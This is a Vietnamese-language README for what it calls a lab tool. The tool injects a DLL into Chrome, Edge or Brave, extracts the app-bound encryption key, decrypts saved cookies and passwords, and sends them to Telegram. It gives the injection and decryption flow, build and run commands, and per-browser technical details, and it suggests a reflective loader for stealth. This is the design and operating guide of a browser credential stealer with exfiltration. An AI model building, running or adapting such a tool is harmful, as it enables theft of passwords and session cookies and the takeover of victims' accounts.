# ABE key extraction + v20 decryption (lab)

Mục tiêu: lấy app-bound key từ Chrome/Edge rồi giải mã cookie/password `v20`,
gửi kết quả về Telegram. Dùng cho lab cá nhân, browser 64-bit, cùng user.

## Thành phần

```
abe_payload.dll   # inject vào browser process; gọi IElevator::DecryptData
abe_inject.exe    # tìm browser, inject DLL, đọc key, decrypt DB, gửi Telegram
```

Luồng:

```
abe_inject.exe
  -> tìm chrome.exe/msedge.exe/brave.exe (browser process, không có --type=)
  -> LoadLibrary inject abe_payload.dll
       -> đọc Local State -> app_bound_encrypted_key (base64, APPB)
       -> CoCreateInstance IElevator2/IElevator
       -> DecryptData -> 32-byte key -> %TEMP%\abe_key.bin
  <- đọc key
  -> đọc os_crypt.encrypted_key (legacy DPAPI, cho v10)
  -> copy Cookies / Login Data (+ -wal/-shm)
  -> winsqlite3 query
  -> BCrypt AES-256-GCM decrypt v20/v10
  -> JSON lines -> Telegram sendDocument
```

## Build

```bash
./build.sh
```

Hoặc thủ công:

```bash
x86_64-w64-mingw32-g++ -shared -o abe_payload.dll abe_payload.cpp \
  -static -lole32 -loleaut32 -lshlwapi -lshell32

x86_64-w64-mingw32-g++ -o abe_inject.exe abe_inject.cpp \
  -mwindows -static \
  -lwinhttp -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi -lshell32 -ladvapi32
```

## Chạy

Đặt `abe_inject.exe` và `abe_payload.dll` cùng thư mục. Chạy:

```powershell
.\abe_inject.exe            # auto: Chrome trước, rồi Edge/Brave
.\abe_inject.exe chrome     # ép Chrome
.\abe_inject.exe edge       # ép Edge
.\abe_inject.exe 1234       # ép PID
```

Kết quả về Telegram:

```
abe_cookies.json
abe_passwords.json
ABE dump xong: N mục. Key OK.
```

Nếu lỗi, payload ghi `%TEMP%\abe_key_err.txt`; injector gửi nội dung lỗi về Telegram.

## Yêu cầu / giới hạn

- Browser **64-bit**, cùng user với injector.
- Phải là **browser process** (không có `--type=`). Không inject vào Network Service/Renderer: sandbox chặn COM/RPC.
- Browser phải dùng **user-data-dir mặc định**; ABE trả `kNotUsingDefaultUserDataDir` nếu dùng thư mục profile tùy biến.
- Chỉ quét profile `Default`. Nhiều profile (`Profile 1`, ...) chưa xử lý.
- Edge có thêm `aster_app_bound_encrypted_key` cho password import/Copilot; module này chưa lấy key phụ đó.
- Dùng **LoadLibrary injection** (ổn định), không phải reflective. DLL vẫn nằm trong Chrome đến khi Chrome thoát. Nếu cần stealth hơn, thay bằng reflective loader.
- `winsqlite3.dll` là DLL hệ thống của Windows 10/11 (không cần bundle SQLite).
- Key ABE chỉ có giá trị trên đúng máy đó; không dùng lại trên máy khác.

## Ghi chú kỹ thuật

- Chrome/Brave: `DecryptData` ở vtable index 5; Edge: index 8.
- `CoInitializeEx(COINIT_APARTMENTTHREADED)` + `EOAC_DYNAMIC_CLOAKING` theo đúng cách xaitax dùng.
- Chrome 144+: thử IID `IElevator2` trước, fallback `IElevator`.
- Cookie v20: plaintext = `SHA-256(host_key)` (32 byte) + value; code kiểm tra hash trước khi strip.
- Password v20: plaintext chính là password.
- v10 (dữ liệu cũ) dùng key `os_crypt.encrypted_key` qua DPAPI.
